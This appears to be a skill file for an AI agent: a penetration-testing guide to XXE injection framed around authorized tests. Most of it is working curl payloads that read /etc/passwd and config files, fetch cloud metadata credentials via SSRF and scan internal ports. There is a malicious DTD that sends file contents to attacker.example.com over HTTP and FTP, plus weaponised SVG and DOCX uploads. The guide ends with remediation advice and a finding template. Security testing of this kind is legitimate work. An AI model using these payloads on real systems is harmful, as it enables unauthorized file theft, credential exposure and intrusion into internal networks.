---
name: testing-for-xxe-injection-vulnerabilities
description: Discovering and exploiting XML External Entity injection vulnerabilities to read server files, perform SSRF, and exfiltrate data during authorized penetration tests.
domain: cybersecurity
subdomain: web-application-security
tags: [penetration-testing, xxe, xml-injection, owasp, web-security, burpsuite]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Testing for XXE Injection Vulnerabilities

## When to Use

- During authorized penetration tests when the application processes XML input (SOAP APIs, file uploads, RSS feeds)
- When testing APIs that accept `Content-Type: application/xml` or `text/xml`
- For assessing XML parsers in file upload functionality (DOCX, XLSX, SVG, PDF)
- When evaluating SOAP-based web services for entity injection
- During security assessments of enterprise applications using XML configuration

## Prerequisites

- **Authorization**: Written penetration testing agreement for the target
- **Burp Suite Professional**: For intercepting and modifying XML requests
- **XXEinjector**: Automated XXE exploitation tool (`git clone https://github.com/enjoiz/XXEinjector.git`)
- **Out-of-band server**: Burp Collaborator or interactsh for blind XXE detection
- **curl**: For manual payload crafting and submission
- **Python**: For building DTD hosting server

## Workflow

### Step 1: Identify XML Processing Points

Find all application endpoints that accept or process XML data.

```bash
# Look for XML content types in Burp proxy history
# Filter for: Content-Type: application/xml, text/xml, application/soap+xml

# Test if JSON endpoints also accept XML
# Original JSON request:
curl -s -X POST \
  -H "Content-Type: application/json" \
  -d '{"search":"test"}' \
  "https://target.example.com/api/search"

# Try converting to XML:
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><root><search>test</search></root>' \
  "https://target.example.com/api/search"

# Check file upload endpoints for XML-based formats
# DOCX, XLSX, PPTX, SVG, PDF, XML, RSS, ATOM, SOAP
# These all contain XML that may be parsed server-side

# Check for SOAP endpoints
curl -s -X POST \
  -H "Content-Type: text/xml" \
  -H "SOAPAction: \"\"" \
  -d '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test/></soap:Body></soap:Envelope>' \
  "https://target.example.com/ws/service"
```

### Step 2: Test for Basic XXE with File Retrieval

Inject XML entities to read local files from the server.

```bash
# Basic XXE payload to read /etc/passwd
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><search>&xxe;</search></root>' \
  "https://target.example.com/api/search"

# Windows file read
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root><search>&xxe;</search></root>' \
  "https://target.example.com/api/search"

# Read application configuration files
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///var/www/html/config.php">
]>
<root><search>&xxe;</search></root>' \
  "https://target.example.com/api/search"

# PHP filter wrapper for base64 encoding (avoids XML parsing errors)
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<root><search>&xxe;</search></root>' \
  "https://target.example.com/api/search"
```

### Step 3: Test Blind XXE with Out-of-Band Detection

When the entity value is not reflected in the response, use out-of-band techniques.

```bash
# Blind XXE with HTTP callback (use Burp Collaborator or interactsh)
# Start interactsh: interactsh-client
# Use the generated domain: abc123.oast.fun

curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://abc123.oast.fun/xxe-test">
]>
<root><search>&xxe;</search></root>' \
  "https://target.example.com/api/search"

# Check interactsh/Collaborator for incoming DNS or HTTP requests

# Blind XXE with DNS exfiltration
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://xxe-confirmed.abc123.oast.fun">
]>
<root><search>&xxe;</search></root>' \
  "https://target.example.com/api/search"

# Blind XXE via parameter entities (when regular entities are blocked)
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://abc123.oast.fun/xxe-param">
  %xxe;
]>
<root><search>test</search></root>' \
  "https://target.example.com/api/search"
```

### Step 4: Exfiltrate Data via Out-of-Band XXE

Use external DTD to extract file contents through HTTP requests.

```bash
# Host a malicious DTD file on attacker server
# Create file: evil.dtd
cat > /tmp/evil.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example.com/?data=%file;'>">
%eval;
%exfil;
EOF

# Host the DTD
cd /tmp && python3 -m http.server 8888 &

# Send the XXE payload referencing the external DTD
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://attacker.example.com:8888/evil.dtd">
  %dtd;
]>
<root><search>test</search></root>' \
  "https://target.example.com/api/search"

# For multi-line file exfiltration, use FTP protocol
# evil-ftp.dtd:
cat > /tmp/evil-ftp.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://attacker.example.com/%file;'>">
%eval;
%exfil;
EOF

# Use xxeserv or similar FTP listener to capture multi-line output
# python3 xxeserv.py --ftp --port 2121
```

### Step 5: Test XXE via File Uploads

Test XML parsing in document upload functionality.

```bash
# SVG file with XXE
cat > /tmp/xxe.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="0" y="20">&xxe;</text>
</svg>
EOF

# Upload the SVG
curl -s -X POST \
  -F "file=@/tmp/xxe.svg;type=image/svg+xml" \
  -b "session=abc123" \
  "https://target.example.com/api/upload/avatar"

# DOCX file with XXE (DOCX is a ZIP containing XML files)
mkdir -p /tmp/xxe-docx
cd /tmp/xxe-docx
# Unzip a legitimate .docx file
unzip /tmp/template.docx -d /tmp/xxe-docx

# Inject XXE into [Content_Types].xml or document.xml
# Add DTD with external entity to document.xml
# Repackage: cd /tmp/xxe-docx && zip -r /tmp/malicious.docx *

# XLSX with XXE (same technique as DOCX)
# Inject into xl/sharedStrings.xml or [Content_Types].xml
```

### Step 6: Test XXE for Server-Side Request Forgery (SSRF)

Use XXE to make the server send requests to internal services.

```bash
# SSRF via XXE to cloud metadata
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><search>&xxe;</search></root>' \
  "https://target.example.com/api/search"

# Internal port scanning via XXE
for port in 22 80 443 3306 5432 6379 8080 8443 9200; do
  echo -n "Port $port: "
  curl -s -X POST --max-time 5 \
    -H "Content-Type: application/xml" \
    -d "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://127.0.0.1:$port/\">]><root><search>&xxe;</search></root>" \
    "https://target.example.com/api/search" | head -c 100
  echo
done

# Access internal services
curl -s -X POST \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-admin.local:8080/admin">
]>
<root><search>&xxe;</search></root>' \
  "https://target.example.com/api/search"
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **XML External Entity** | An entity defined in a DTD that references external resources via SYSTEM or PUBLIC keywords |
| **DTD (Document Type Definition)** | Defines the structure and legal elements of an XML document, including entity declarations |
| **Internal Entity** | Entity defined with a value directly in the DTD (`<!ENTITY name "value">`) |
| **External Entity** | Entity that loads content from a URI (`<!ENTITY name SYSTEM "uri">`) |
| **Parameter Entity** | Entity used within the DTD itself, prefixed with `%` (`<!ENTITY % name SYSTEM "uri">`) |
| **Blind XXE** | XXE where entity values are not reflected in the response, requiring out-of-band exfiltration |
| **Billion Laughs (DoS)** | Recursive entity expansion attack causing exponential memory consumption |
| **XXE to SSRF** | Using XXE to make the server send HTTP requests to internal or external services |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **Burp Suite Professional** | Request interception, modification, and Collaborator for OOB detection |
| **XXEinjector** | Automated XXE exploitation with file exfiltration and SSRF capabilities |
| **interactsh** | Out-of-band interaction server for detecting blind XXE callbacks |
| **xxeserv** | Dedicated FTP/HTTP server for XXE data exfiltration |
| **OWASP ZAP** | Automated XXE scanning in active scan mode |
| **DTD-Finder** | Discovers DTD files on the server for entity injection |

## Common Scenarios

### Scenario 1: SOAP API File Read
A SOAP web service processes XML input without disabling external entities. Injecting a DTD with a SYSTEM entity in the SOAP body reads `/etc/passwd` and returns it in the SOAP response.

### Scenario 2: SVG Upload Blind XXE
An image upload feature accepts SVG files. The SVG is parsed server-side for thumbnail generation. Using a blind XXE payload in the SVG, server files are exfiltrated via out-of-band HTTP requests.

### Scenario 3: JSON to XML Content-Type Switch
A REST API primarily uses JSON but the XML parser is also enabled. Switching `Content-Type` to `application/xml` and sending an XXE payload exposes server files through the API response.

### Scenario 4: DOCX Processing XXE
A resume upload feature processes DOCX files. Injecting XXE into the `[Content_Types].xml` file within the DOCX archive triggers file read when the document is parsed server-side.

## Output Format

```
## XXE Injection Finding

**Vulnerability**: XML External Entity (XXE) Injection
**Severity**: Critical (CVSS 9.1)
**Location**: POST /api/search (Content-Type: application/xml)
**OWASP Category**: A05:2021 - Security Misconfiguration

### Reproduction Steps
1. Send POST request to /api/search with Content-Type: application/xml
2. Include DTD with external entity: <!ENTITY xxe SYSTEM "file:///etc/passwd">
3. Reference entity in XML body: <search>&xxe;</search>
4. Server returns file contents in the response

### Confirmed Impact
- Local file read: /etc/passwd, /etc/hostname, application config files
- SSRF: Accessed AWS metadata at 169.254.169.254
- Internal network scanning: Identified internal services on ports 3306, 6379, 8080

### Files Retrieved
| File | Contents Summary |
|------|-----------------|
| /etc/passwd | 42 user accounts, service accounts identified |
| /var/www/html/config.php | Database credentials in plaintext |
| /etc/hostname | Internal hostname: prod-web-01 |

### Recommendation
1. Disable external entity processing in the XML parser
2. Disable DTD processing entirely if not required
3. Use JSON instead of XML where possible
4. Implement input validation to reject DTD declarations in XML input
5. Apply least-privilege file system permissions for the web server user
```
